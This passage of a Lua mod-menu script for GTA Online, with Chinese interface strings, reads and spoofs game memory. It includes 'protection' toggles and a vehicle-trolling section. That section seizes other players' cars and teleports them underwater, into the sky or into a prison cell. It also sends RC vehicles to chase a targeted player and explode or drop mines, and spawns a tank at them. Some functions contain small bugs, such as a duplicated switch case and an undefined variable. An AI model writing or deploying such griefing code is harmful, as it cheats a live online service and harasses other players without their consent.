        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    local playerList = players.list(true, true, true)
    for i = 1, #playerList do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerList[i], true)
        end
    end
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(entity, false)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
end

function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end

function block(cord)
    local hash = 309416120
    loadModel(hash)
    for i = 0, 180, 8 do
        local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, cord[1], cord[2], cord[3], true, true, true)
        ENTITY.SET_ENTITY_HEADING(wall, i)
        netItAll(wall)
        util.yield(10)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
end

function string.capitalize(str)
    return str:sub(1,1):upper()..str:sub(2):lower()
end





------------------------------------
-----------防护选项-----------------
------------------------------------  
function blockstealer()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("拦截劫匪来自 " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end

function blockstealerother()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("拦截劫匪发送来自 " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end

notificationBits = 0
nearbyNotificationBits = 0
blips = {}

---@param player Player
---@return boolean
local function IsPlayerFlyingAnyDrone(player)
    local address = memory.script_global(1853348 + (player * 834 + 1) + 267 + 348)
    return BitTest(memory.read_int(address), 26)
end


---@param player Player
---@return integer
local function GetPlayerDroneType(player)
    local p_type = memory.script_global(1911933 + (player * 260 + 1) + 93)
    return memory.read_int(p_type)
end


---@param player Player
---@return Object
local function GetPlayerDroneObject(player)
    local p_object = memory.script_global(1911933 + (players.user() * 260 + 1) + 60 + (player + 1))
    return memory.read_int(p_object)
end


---@param heading number
---@return number
local function InvertHeading(heading)
    if heading > 180.0 then
        return heading - 180.0
    end
    return heading + 180.0
end


---@param droneType integer
---@return integer
local function GetDroneBlipSprite(droneType)
    return (droneType == 8 or droneType == 4) and 548 or 627
end


---@param droneType integer
---@return string
local function GetNotificationMsg(droneType, nearby)
    if droneType == 8 or droneType == 4 then
        return nearby and "%s's 的导弹在 ~r~附近~s~" or "%s 正在使用导弹"
    end
    return nearby and "%s's 的无人机在 ~r~附近~s~" or "%s 正在驾驶无人机"
end


---@param index integer
function RemoveBlipIndex(index)
    if HUD.DOES_BLIP_EXIST(blips[index]) then
        util.remove_blip(blips[index]); blips[index] = 0
    end
end


---@param player Player
function AddBlipForPlayerDrone(player)
    if not blips[player] then
        blips[player] = 0
    end

    if is_player_active(player, true, true) and players.user() ~= player and IsPlayerFlyingAnyDrone(player) then
        if ENTITY.DOES_ENTITY_EXIST(GetPlayerDroneObject(player)) then
            local obj = GetPlayerDroneObject(player)
            local pos = ENTITY.GET_ENTITY_COORDS(obj, true)
            local heading = InvertHeading(ENTITY.GET_ENTITY_HEADING(obj))

            if not HUD.DOES_BLIP_EXIST(blips[player]) then
                blips[player] = HUD.ADD_BLIP_FOR_ENTITY(obj)
                local sprite = GetDroneBlipSprite(GetPlayerDroneType(player))
                HUD.SET_BLIP_SPRITE(blips[player], sprite)
                HUD.SHOW_HEIGHT_ON_BLIP(blips[player], false)
                HUD.SET_BLIP_SCALE(blips[player], 0.8)
                HUD.SET_BLIP_NAME_TO_PLAYER_NAME(blips[player], player)
                HUD.SET_BLIP_COLOUR(blips[player], get_player_org_blip_colour(player))

            else
                HUD.SET_BLIP_DISPLAY(blips[player], 2)
                HUD.SET_BLIP_COORDS(blips[player], pos.x, pos.y, pos.z)
                HUD.SET_BLIP_ROTATION(blips[player], math.ceil(heading))
                HUD.SET_BLIP_PRIORITY(blips[player], 9)
            end

            if not BitTest(nearbyNotificationBits, player) and HUD.DOES_BLIP_EXIST(blips[player]) then
                local msg = GetNotificationMsg(GetPlayerDroneType(player), true)
                notification:normal(msg, HudColour.blue, get_condensed_player_name(player))
                nearbyNotificationBits = SetBit(nearbyNotificationBits, player)
            end

        else
            RemoveBlipIndex(player)
            nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
        end

        if not BitTest(notificationBits, player) then
            local msg = GetNotificationMsg(GetPlayerDroneType(player), false)
            notification123:normal(msg, HudColour.blue, get_condensed_player_name(player))
            notificationBits = SetBit(notificationBits, player)
        end

    else
        RemoveBlipIndex(player)
        notificationBits = ClearBit(notificationBits, player)
        nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
    end
end

local notified_mugger = false
function show_mugger()
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        util.spoof_script("am_gang_call", function()
            local netId	= memory.read_int(memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1)))
            if NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(netId) and
            not ENTITY.IS_ENTITY_DEAD(NETWORK.NET_TO_PED(netId), false) then
                local mugger = NETWORK.NET_TO_PED(netId)
                draw_bounding_box(mugger, true, {r = 255, g = 0, b = 0, a = 80})
            end

            local p_sender = memory.script_local("am_gang_call", 287)
            if not notified_mugger and p_sender ~= 0 and memory.read_int(p_sender) ~= players.user() and
            is_player_active(memory.read_int(p_sender), false, false) then
                local sender = memory.read_int(p_sender)
                notification123:normal("%s 给你发送了一个劫匪", HudColour.blue, get_condensed_player_name(sender))
                notified_mugger = true
            end
        end)
    elseif notified_mugger then
        notified_mugger = false
    end
end

function removeanything()
    local cleanse_entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
            entities.delete_by_handle(ped)
            cleanse_entitycount += 1
        end
    end
    util.toast("已清除" .. cleanse_entitycount .. "个NPC")
    cleanse_entitycount = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(veh)
        cleanse_entitycount += 1
        util.yield()
    end
    util.toast("已清除".. cleanse_entitycount .."个载具")
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(object)
        cleanse_entitycount += 1
    end
    util.toast("已清除" .. cleanse_entitycount .. "物体")
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(pickup)
        cleanse_entitycount += 1
    end
    util.toast("已清除" .. cleanse_entitycount .. "可拾取物体")
    local temp = memory.alloc(4)
    for i = 0, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
    end
    util.toast("已清除所有绳索")
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    util.toast("已清除所有投掷物")
end


function clearall(index, name)
    util.toast("正在清除"..name:lower().."...")
    local counter = 0
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    pluto_switch index do
        case 1:
            for _, ped in ipairs(entities.get_all_peds_as_handles()) do
                if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and (not NETWORK.NETWORK_IS_ACTIVITY_SESSION() or NETWORK.NETWORK_IS_ACTIVITY_SESSION() and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped)) then
                    entities.delete_by_handle(ped)
                    counter += 1
                    util.yield_once()
                end
            end
            break
        case 2:
            for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
                if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    entities.delete_by_handle(vehicle)
                    counter += 1
                end
                util.yield(25)
            end
            break
        case 3:
            for _, object in ipairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(object)
                counter += 1
                util.yield_once()
            end
            break
        case 4:
            for _, pickup in ipairs(entities.get_all_pickups_as_handles()) do
                entities.delete_by_handle(pickup)
                counter += 1
                util.yield_once()
            end
            break
        case 5:
            local temp = memory.alloc(4)
            for i = 0, 101 do
                memory.write_int(temp, i)
                if PHYSICS.DOES_ROPE_EXIST(temp) then
                    PHYSICS.DELETE_ROPE(temp)
                    counter += 1
                end
                util.yield_once()
            end
            break
        case 6:
            local coords = players.get_position(players.user())
            MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 1000, 0)
            counter = "所有"
            break
        case 4:
            for i = 0, 99 do
                AUDIO.STOP_SOUND(i)
                util.yield_once()
            end
        break
    end
    util.toast("已清除"..tostring(counter).."个"..name:lower()..".")
end

local ped_limit = 175
function petlimit(amount)
    ped_limit = amount
end

local veh_limit = 200
function vehlimit(amount)
    veh_limit = amount
end

local obj_limit = 750
function objlimit(amount)
    obj_limit = amount
end

local projectile_limit = 25
function projectilelimit(amount)
    projectile_limit = amount
end

function pool_limit()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            notification("人物池达到上限,正在清理...", colors.blue)
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            notification("载具池达到上限,正在清理...", colors.blue)
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                util.yield()
                entities.delete_by_handle(obj)
            end
            notification("物体池达到上限,正在清理...", colors.blue)
        end
    end
end

function blockcrasheffect()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end

function blockfireeffect()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    FIRE.STOP_FIRE_IN_RANGE(coords.x, coords.y, coords.z, 100)
    FIRE.STOP_ENTITY_FIRE(players.user_ped())
end

function antianimal()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        util.toast(players.get_name(host).." 检测到战局《猎杀野兽》事件,正在阻止.")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end

local cageModels <const> =
{
    "prop_gold_cont_01",
    "prop_gold_cont_01b",
    "prop_feeder1_cr",
    "prop_rub_cage01a",
    "stt_prop_stunt_tube_s",
    "stt_prop_stunt_tube_end",
    "prop_jetski_ramp_01",
    "stt_prop_stunt_tube_xs",
    "prop_fnclink_03e",
    "prop_container_05a",
    "prop_jetski_ramp_01",
    "prop_cs_dumpster_01a",
    "p_v_43_safe_s",
    "bkr_prop_moneypack_03a",
    "prop_elecbox_12"
}

local lastMsg = ""
local lastNotification <const> = newTimer()
local format = "笼子物体来自 %s"

function anticage()
	local myPos = players.get_position(players.user())
	for _, model in ipairs(cageModels) do
		local modelHash <const> =  util.joaat(model)
		local obj = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(myPos.x,myPos.y,myPos.z, 8.0, modelHash, false, false, false)
		if obj == 0 or not ENTITY.DOES_ENTITY_EXIST(obj) or
		not ENTITY.IS_ENTITY_AT_ENTITY(players.user_ped(), obj, 5.0, 5.0, 5.0, false, true, 0) then
			continue
		end
		local ownerId = get_entity_owner(obj)
		local msg = string.format(format, get_condensed_player_name(ownerId))
		if ownerId ~= players.user() and is_player_active(ownerId, false, false) and
		(lastMsg ~= msg or lastNotification.elapsed() >= 15000) then
			notification(msg, HudColour.blueLight)
			lastMsg = msg
			lastNotification.reset()
		end
		request_control(obj, 1500)
		entities.delete_by_handle(obj)
	end
end

function blocknetwork(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockNetEvents)
        notification("已阻止所有网络传输", colors.blue)
    else
        menu.trigger_command(UnblockNetEvents)
        notification("关闭阻止网络传输", colors.red)
    end
end

function blockincoming(on_toggle)
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockIncSyncs)
        notification("开启阻止网络事件传入", colors.blue)
    else
        menu.trigger_command(UnblockIncSyncs)
        notification("关闭阻止网络事件传入", colors.red)
    end
end

function blockout(on_toggle)
    if on_toggle then
        notification("开启阻止网络事件传出", colors.blue)
        menu.trigger_commands("desyncall on")
    else
        notification("关闭阻止网络事件传出", colors.red)
        menu.trigger_commands("desyncall off")
    end
end

function chickenmode(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notification("开启自闭模式", colors.green)
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notification("关闭自闭模式", colors.red)
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end


------------------------------------
-----------载具恶搞-----------------
------------------------------------  

function log(content)
    if verbose then
        util.log("[BaiBaiScript] " .. content)
    end
end

local function get_ground_z(coords)
    local start_time = os.time()
    while true do
        if os.time() - start_time >= 5 then
            log("未能在5秒内到达地面Z轴高度")
            return nil
        end
        local success, est = util.get_ground_z(coords['x'], coords['y'], coords['z']+2000)
        if success then
            log("成功获得地面 ： " .. est)
            return est
        end
        util.yield()
    end
end

function get_waypoint_coords()
    local coords = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
    if coords['x'] == 0 and coords['y'] == 0 and coords['z'] == 0 then
        return nil
    else
        local estimate = get_ground_z(coords)
        if estimate then
            coords['z'] = estimate
        end
        return coords
    end
end

function set_player_into_suitable_seat(ent)
    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
    if not PED.IS_PED_A_PLAYER(driver) or driver == 0 then
        if driver ~= 0 then
            entities.delete_by_handle(driver)
        end
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
    else
        for i=0, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(ent) do
            if VEHICLE.IS_VEHICLE_SEAT_FREE(ent, i) then
                PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
            end
        end
    end
end


function request_control_of_entity(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        local st_time = os.time()
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) do
            if os.time() - st_time >= 5 then
                util.log("未能在5秒内请求实体控制(实体 " .. ent .. ")")
                break
            end
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            util.yield()
        end
    end
end

local function tp_player_car_to_coords(pid, coord)
    local name = PLAYER.GET_PLAYER_NAME(pid)
    if robustmode then
        menu.trigger_commands("spectate" .. name .. " on")
        util.yield(1000)
    end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(car) then
            for i=1, 3 do
                util.toast("成功")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, coord['x'], coord['y'], coord['z'], false, false, false)
            end
        end
    end
end

function tp_all_player_cars_to_coords(coord)
    for k,pid in pairs(players.list(false, true, true)) do
        tp_player_car_to_coords(pid, coord)
    end
end

function tpcartome(pid)
    tp_player_car_to_coords(pid, ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
end

function tocartopoint(pid)
    local c = get_waypoint_coords()
    if c ~= nil then
        tp_player_car_to_coords(pid, c)
    end
end

function tptomaze(pid)
    local c = {}
    c.x = -75.261375
    c.y = -818.674
    c.z = 326.17517
    tp_player_car_to_coords(pid, c)
end

function tptounderwater(pid)
    local c = {}
    c.x = 4497.2207
    c.y = 8028.3086
    c.z = -32.635174
    tp_player_car_to_coords(pid, c)
end

function tptohighair(pid)
    local c = {}
    c.x = -75
    c.y = -818
    c.z = 2400
    tp_player_car_to_coords(pid, c)
end

function tolsc(pid)
    local c = {}
    c.x = -353.84512
    c.y = -135.59108
    c.z = 39.009624
    tp_player_car_to_coords(pid, c)
end

function tpscp(pid)
    local c = {}
    c.x = 1642.8401
    c.y = 2570.7695
    c.z = 45.564854
    tp_player_car_to_coords(pid, c)
end

function tocell(pid)
    local c = {}
    c.x = 1737.1896
    c.y = 2634.897
    c.z = 45.56497
    tp_player_car_to_coords(pid, c)
end

local function create_trolly_vehicle(targetId, vehicleHash, pedHash)
    request_model(vehicleHash); request_model(pedHash)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
    local driver = 0
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isTrollyVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    for i = 0, 50 do
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
    end
    local offset = get_random_offset_from_entity(vehicle, 25.0, 25.0)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE(offset.x, offset.y, offset.z, outCoords, 1, 3.0, 0.0) then
        driver = entities.create_ped(5, pedHash, pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, true, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, true)
        set_entity_face_entity(vehicle, targetPed, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        VEHICLE.SET_VEHICLE_IS_CONSIDERED_BY_PLAYER(vehicle, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 500.0, 786988, 0.0, 0.0, true)
        PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(driver, 1)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    end
    return vehicle, driver
end

local setInvincible = false
local count = 1
local AttackType <const> = {explode = 0, dropMine = 1}
local attacktype = 0
local selectedMine = 1
local mineSlider

function send_veh_attack(opt, index, pid)
    local pedHash <const> = util.joaat("mp_m_freemode_01")
		local i = 0
		repeat
			if opt == "Bandito" then
				local vehicleHash <const> = util.joaat("rcbandito")
				local pedHash <const> = util.joaat("mp_m_freemode_01")
				local vehicle, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				add_blip_for_entity(vehicle, 646, 4)
				ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setInvincible)
				ENTITY.SET_ENTITY_VISIBLE(driver, false, false)

			elseif opt == "Go-Kart" then
				local vehicleHash <const> = util.joaat("veto2")
				local gokart, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				ENTITY.SET_ENTITY_INVINCIBLE(gokart, setInvincible)
				VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
				VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
				ENTITY.SET_ENTITY_INVINCIBLE(driver, setInvincible)

				PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
				PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
				add_blip_for_entity(gokart, 748, 5)
			end
			i = i + 1
			util.yield(150)
		until i == count
    end

function send_veh_attack_god(toggle)
    setInvincible = toggle 
end

local GetMineHash = function()
    if selectedMine == 1 then
        return util.joaat("vehicle_weapon_mine_kinetic_rc")
    elseif selectedMine == 2 then
        return util.joaat("vehicle_weapon_mine_emp_rc")
    end
end

function send_veh_attacker(pid)
    local vehicleHash <const> = util.joaat("rcbandito")
    local pedHash <const> = util.joaat("mp_m_freemode_01")
    local lastShoot = newTimer()

    local bandito, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
    VEHICLE.SET_VEHICLE_MOD(bandito, 5, 3, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 48, 5, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 9, 0, false)
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(bandito, 128, 0, 128)
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(bandito, 128, 0, 128)
    ENTITY.SET_ENTITY_VISIBLE(driver, false, false)
    local blip = add_blip_for_entity(bandito, 646, 27)

    util.create_tick_handler(function()
        if not ENTITY.DOES_ENTITY_EXIST(bandito) or ENTITY.IS_ENTITY_DEAD(bandito, false) or
        not ENTITY.DOES_ENTITY_EXIST(driver) or ENTITY.IS_ENTITY_DEAD(driver, false) then
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false

        elseif is_player_active(pid, false, true) then
            local playerPos = players.get_position(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(bandito, true)

            if playerPos:distance(pos) > 3.0 or not request_control_once(bandito) or
            not request_control_once(driver) then
                return
            end

            if attacktype == AttackType.explode then
                NETWORK.NETWORK_EXPLODE_VEHICLE(bandito, true, false, NETWORK.PARTICIPANT_ID_TO_INT())
                ENTITY.SET_ENTITY_HEALTH(driver, 0, 0)

            elseif attacktype == AttackType.dropMine and
            (not lastShoot.isEnabled() or lastShoot.elapsed() > 1000) and not
            MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, GetMineHash(), 3.0, true) then
                local weapon <const> = GetMineHash()

                if not WEAPON.HAS_WEAPON_ASSET_LOADED(weapon) then
                    WEAPON.REQUEST_WEAPON_ASSET(weapon, 31, 26)
                    return
                end

                local min, max = v3.new(), v3.new()
                local modelHash = ENTITY.GET_ENTITY_MODEL(bandito)
                MISC.GET_MODEL_DIMENSIONS(modelHash, min, max)

                local coord0 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, 0.2)
                local coord1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, min.z)

                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
                    coord0.x, coord0.y, coord0.z, coord1.x, coord1.y, coord1.z, 0, true, weapon, players.user(), true, false, -1.0, 0, false, false, 0, true, 1, 0, 0)
                lastShoot.reset()
            end
        elseif request_control(bandito) and request_control(driver) then
            TASK.CLEAR_PED_TASKS(driver)
            TASK.TASK_VEHICLE_DRIVE_WANDER(driver, bandito, 10.0, 786603)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
            remove_decor(bandito)
            util.remove_blip(blip)
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false
        end
    end)
end

function send_veh_attacker_weapon(index, value)
    if index == 1 then
        attacktype = AttackType.explode
        menu.set_visible(mineSlider, false)
    elseif index == 2 then
        attacktype = AttackType.dropMine
        menu.set_visible(mineSlider, true)
    end
end

function send_veh_attacker_weapon_mine(index, value)
    selectedMine = index
end

function send_veh_attacker_number(value)
    count = value
end

DecorFlag_isTrollyVehicle = 1 << 0
function dele_all_veh_attacker()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isTrollyVehicle) then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
            entities.delete_by_handle(driver)
            entities.delete_by_handle(vehicle)
        end
    end
end

DecorFlag_isEnemyVehicle = 1 << 1
local setGodmode = false
local gunnerWeapon = util.joaat("weapon_mg")
local weaponModId = -1


---@param targetId integer
local function spawn_minitank(targetId)
    local vehicleHash <const> = util.joaat("minitank")
    local pedHash <const> = util.joaat("s_m_y_blackops_01")
    request_model(vehicleHash); request_model(pedHash)
    local pos = players.get_position(targetId)
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
        return
    end
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isEnemyVehicle)
    local offset = get_random_offset_from_entity(vehicle, 35.0, 50.0)
